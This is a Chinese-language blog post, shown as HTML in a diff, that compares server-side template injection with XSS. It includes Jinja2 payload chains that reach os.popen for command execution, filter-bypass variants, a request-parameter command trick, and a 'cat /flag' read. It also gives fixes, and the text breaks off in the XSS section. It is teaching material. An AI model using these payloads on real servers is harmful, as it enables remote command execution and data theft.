@@ -1,0 +1,1324 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar-favicon.png">
+  <link rel="icon" href="/img/avatar-favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="AMOUR">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SSTI 是服务端模板注入，代码在服务器上执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI 与 XSS 的区别">
+<meta property="og:url" content="https://changee25.github.io/2026/11/02/about-ssti-xss/">
+<meta property="og:site_name" content="AMOUR">
+<meta property="og:description" content="SSTI 是服务端模板注入，代码在服务器上执行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://changee25.github.io/img/cover-default.jpg">
+<meta property="article:published_time" content="2026-11-02T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-11T18:10:06.848Z">
+<meta property="article:author" content="AMOUR">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://changee25.github.io/img/cover-default.jpg">
+  
+  
+  
+  <title>SSTI 与 XSS 的区别 - AMOUR</title>
+
+  <link  rel="stylesheet" href="/vendor/lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="/vendor/lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="/vendor/lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="/vendor/lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="/vendor/at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="/vendor/at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"changee25.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AMOUR</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-articles"></i>
+                <span>文章</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/diary/" target="_self">
+                <i class="iconfont icon-date-fill"></i>
+                <span>日记</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-articles"></i>
+                  <span>文章</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/diary/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-date-fill"></i>
+                  <span>日记</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/links/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-link-fill"></i>
+                  <span>友链</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner-post.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">SSTI 与 XSS 的区别</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-11-02 12:00" pubdate>
+          2026年11月2日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          68 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SSTI 与 XSS 的区别</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>SSTI（Server-Side Template Injection，服务端模板注入）</strong>：用户输入被当成“模板代码”交给模板引擎执行，而不是当成普通数据。</p>
+<p>它和 XSS 的区别：</p>
+<ul>
+<li><strong>XSS</strong>：代码在受害者浏览器里执行。</li>
+<li><strong>SSTI</strong>：代码在服务器上执行，可能读文件、读环境变量、连数据库，甚至执行系统命令。</li>
+</ul>
+<h1 id="一、结论对比"><a href="#一、结论对比" class="headerlink" title="一、结论对比"></a>一、结论对比</h1><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>SSTI</th>
+<th>XSS</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>全称</td>
+<td>Server-Side Template Injection</td>
+<td>Cross-Site Scripting</td>
+</tr>
+<tr>
+<td>执行位置</td>
+<td>服务器</td>
+<td>浏览器</td>
+</tr>
+<tr>
+<td>被解释的内容</td>
+<td>模板表达式</td>
+<td>HTML &#x2F; JavaScript</td>
+</tr>
+<tr>
+<td>典型引擎</td>
+<td>Jinja2、Twig、FreeMarker、Velocity</td>
+<td>浏览器 HTML 解析器、JS 引擎</td>
+</tr>
+<tr>
+<td>探测 payload</td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code> → <code>49</code></td>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td>主要危害</td>
+<td>读文件、读配置、RCE</td>
+<td>盗会话、CSRF、钓鱼、篡改页面</td>
+</tr>
+<tr>
+<td>根本修复</td>
+<td>不把用户输入当模板</td>
+<td>上下文输出编码、CSP、安全 API</td>
+</tr>
+<tr>
+<td>典型场景</td>
+<td>Flask&#x2F;Jinja2 错误页、邮件模板</td>
+<td>评论、搜索回显、后台管理页</td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="二、SSTI-是什么"><a href="#二、SSTI-是什么" class="headerlink" title="二、SSTI 是什么"></a>二、SSTI 是什么</h1><h2 id="1-SSTI原理"><a href="#1-SSTI原理" class="headerlink" title="1. SSTI原理"></a>1. SSTI原理</h2><p>模板引擎本来是让开发者写“模板”的：</p>
+<p>html</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">name</span> &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><code>&#123;&#123; name &#125;&#125;</code> 是变量，引擎会把 <code>name</code> 的值填进去。</p>
+<p>正常写法：</p>
+<p>python</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">return</span> <span class="hljs-title function_">render_template</span>(<span class="hljs-string">&quot;hello.html&quot;</span>, name=user_input)<br></code></pre></td></tr></table></figure>
+
+<p>这里用户输入只是<strong>数据</strong>，即使输入：</p>
+<p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>页面也只会显示：</p>
+<p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>危险写法：</p>
+<p>python</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">return</span> <span class="hljs-title function_">render_template_string</span>(<br>    f<span class="hljs-string">&quot;&lt;h1&gt;Hello &#123;user_input&#125;&lt;/h1&gt;&quot;</span><br>)<br></code></pre></td></tr></table></figure>
+
+<p>这里用户输入被拼进了<strong>模板源码</strong>。<br>如果输入：</p>
+<p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>模板引擎会把它当 <strong>表达式执行</strong>  ，输出：</p>
+<p>代码块</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">49<br></code></pre></td></tr></table></figure>
+
+<p>这就是 SSTI啦</p>
+<hr>
+<h2 id="2-为什么危险"><a href="#2-为什么危险" class="headerlink" title="2. 为什么危险"></a>2. 为什么危险</h2><p>模板表达式不只是能做算术，还能访问 Python 对象。</p>
+<p>Jinja2 里常见利用链：</p>
+<p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>拆开看：</p>
+<ul>
+<li><p><code>cycler</code>：Jinja2 <code>cycler</code>：提供的一个全局对象；</p>
+<details>
+<summary>leave it to myself</summary>
+<p>Jinja2 是 Python/Flask 使用的模板引擎，负责把“模板 + 数据”渲染成 HTML。</p>
+<p>它本身不是漏洞；当用户输入被拼进模板源码并被 <code>render_template_string</code> 编译时，才会形成 SSTI。</p>
+</details>
+</li>
+<li><p><code>cycler.__init__</code>：它的初始化函数；</p>
+</li>
+<li><p><code>__init__.__globals__</code>：这个函数所在模块的全局命名空间；</p>
+</li>
+<li><p>里面能找到 <code>os</code> 模块；</p>
+</li>
+<li><p><code>os.popen()</code> 执行系统命令；</p>
+</li>
+<li><p><code>.read()</code> 读取命令输出。</p>
+</li>
+</ul>
+<p>于是 SSTI 从“模板注入”升级成了 <strong>RCE（远程命令执行）</strong>。</p>
+<p>除了命令执行，还可以：</p>
+<p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>泄露 Flask 配置，例如 <code>SECRET_KEY</code>。</p>
+<p>还可以读文件、读环境变量、连数据库、横向移动。</p>
+<hr>
+<h2 id="3-SSTI-怎么发现"><a href="#3-SSTI-怎么发现" class="headerlink" title="3. SSTI 怎么发现"></a>3. SSTI 怎么发现</h2><p>找“用户输入被服务端模板处理”的地方，然后输入表达式。</p>
+<p>常见探测：</p>
+<table>
+<thead>
+<tr>
+<th>payload</th>
+<th>可能对应的引擎</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#123;&#123;7*7&#125;&#125;</code></td>
+<td>Jinja2、Twig、Nunjucks</td>
+</tr>
+<tr>
+<td><code>$&#123;7*7&#125;</code></td>
+<td>JSP EL、FreeMarker</td>
+</tr>
+<tr>
+<td><code>&lt;%= 7*7 %&gt;</code></td>
+<td>ERB、EJS</td>
+</tr>
+<tr>
+<td><code>#&#123;7*7&#125;</code></td>
+<td>Ruby、某些 Java 模板</td>
+</tr>
+<tr>
+<td><code>*&#123;7*7&#125;</code></td>
+<td>Thymeleaf</td>
+</tr>
+</tbody></table>
+<p>如果页面返回 <code>49</code>，说明表达式被执行了。</p>
+<p>进一步判断 Jinja2：</p>
+<p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-string">&#x27;7&#x27;</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>Python 里字符串乘法会得到：</p>
+<p>代码块</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">7777777<br></code></pre></td></tr></table></figure>
+
+<p>这比单纯 <code>7*7</code> 更能说明是 Python&#x2F;Jinja2。</p>
+<hr>
+<h2 id="4-SSTI-的利用思路"><a href="#4-SSTI-的利用思路" class="headerlink" title="4. SSTI 的利用思路"></a>4. SSTI 的利用思路</h2><h3 id="第一步：确认注入"><a href="#第一步：确认注入" class="headerlink" title="第一步：确认注入"></a>第一步：确认注入</h3><p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml">  → 49</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="第二步：找对象链"><a href="#第二步：找对象链" class="headerlink" title="第二步：找对象链"></a>第二步：找对象链</h3><p>Jinja2 常见全局对象：</p>
+<p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">namespace</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>常见链：</p>
+<p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.os.popen</span>(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">namespace.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request.application.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="第三步：读文件或执行命令"><a href="#第三步：读文件或执行命令" class="headerlink" title="第三步：读文件或执行命令"></a>第三步：读文件或执行命令</h3><p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27;ls -la /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="第四步：如果被过滤"><a href="#第四步：如果被过滤" class="headerlink" title="第四步：如果被过滤"></a>第四步：如果被过滤</h3><p>常见绕过：</p>
+<p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler.__init__.__globals__</span>[&#x27;o&#x27;+&#x27;s&#x27;].popen(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler</span>|attr(<span class="hljs-name">&#x27;__init__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__getitem__&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;id&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>也可以把命令放到请求参数里：</p>
+<p>代码块</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler.__init__.__globals__.os.popen</span>(<span class="hljs-name">request.args.cmd</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<p>代码块</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">/?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">id</span></span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="5-SSTI-题的例子"><a href="#5-SSTI-题的例子" class="headerlink" title="5.  SSTI 题的例子"></a>5.  SSTI 题的例子</h2><p>访问不存在的路径：</p>
+<p>代码块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/abc<br></code></pre></td></tr></table></figure>
+
+<p>页面显示：</p>
+<p>代码块</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">Path</span> /abc does <span class="hljs-keyword">not</span> <span class="hljs-keyword">exist</span><br></code></pre></td></tr></table></figure>
+
+<p>说明路径被回显。</p>
+<p>访问：</p>
+<p>代码块</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-title class_">/</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-number">7</span>*<span class="hljs-number">7</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>显示：</p>
+<p>代码块</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">Path</span> /<span class="hljs-number">49</span> does <span class="hljs-keyword">not</span> <span class="hljs-keyword">exist</span><br></code></pre></td></tr></table></figure>
+
+<p>说明 <code>request.path</code> 被拼进模板源码，Jinja2 执行了 <code>&#123;&#123;7*7&#125;&#125;</code>。</p>
+<p>漏洞代码大概类似：</p>
+<p>python</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">@app.errorhandler<span class="hljs-punctuation">(</span><span class="hljs-number">404</span><span class="hljs-punctuation">)</span><br>def not_found<span class="hljs-punctuation">(</span>e<span class="hljs-punctuation">)</span>:<br>    return render_template_string<span class="hljs-punctuation">(</span><br>        f<span class="hljs-string">&quot;&lt;p&gt;Path &#123;request.path&#125; does not exist&lt;/p&gt;&quot;</span><br>    <span class="hljs-punctuation">)</span>, <span class="hljs-number">404</span><br></code></pre></td></tr></table></figure>
+
+<p>正确写法：</p>
+<p>python</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;404.html&quot;</span>, <span class="hljs-built_in">path</span>=request.<span class="hljs-built_in">path</span>), <span class="hljs-number">404</span><br></code></pre></td></tr></table></figure>
+
+<p>模板里：</p>
+<p>html</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Path </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">path</span> &#125;&#125;</span><span class="language-xml"> does not exist<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>这样 <code>path</code> 只是变量，不会被当代码执行。</p>
+<hr>
+<h2 id="6-SSTI-的防御"><a href="#6-SSTI-的防御" class="headerlink" title="6. SSTI 的防御"></a>6. SSTI 的防御</h2><p>核心原则：</p>
+<blockquote>
+<p><strong>永远不要把用户输入拼进模板源码。</strong></p>
+</blockquote>
+<p>正确做法：</p>
+<p>python</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">return</span> <span class="hljs-title function_">render_template</span>(<span class="hljs-string">&quot;page.html&quot;</span>, content=user_input)<br></code></pre></td></tr></table></figure>
+
+<p>如果必须动态模板：</p>
+<ol>
+<li>使用沙箱化模板环境；</li>
+<li>只允许白名单变量和函数；</li>
+<li>不暴露 <code>os</code>、<code>subprocess</code>、<code>__globals__</code> 等危险对象；</li>
+<li>不要用 root 运行 Web 服务；</li>
+<li>WAF 只能作为辅助，不能作为根本修复。</li>
+</ol>
+<hr>
+<h1 id="三、XSS-是什么"><a href="#三、XSS-是什么" class="headerlink" title="三、XSS 是什么"></a>三、XSS 是什么</h1><h2 id="1-XSS原理"><a href="#1-XSS原理" class="headerlink" title="1.XSS原理"></a>1.XSS原理</h2><p>XSS 是攻击者把恶意 JavaScript 注入到网页里，让<strong>其他用户的浏览器</strong>执行。</p>
+<p>正常页面：</p>
+<p>html</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>欢迎，张三<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>如果服务端直接把用户输入拼进 HTML：</p>
+<p>python</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">return f&quot;<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>欢迎，</span><span class="hljs-template-variable">&#123;name&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>用户输入：</p>
+<p>html</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>浏览器收到：</p>
+<p>html</p>
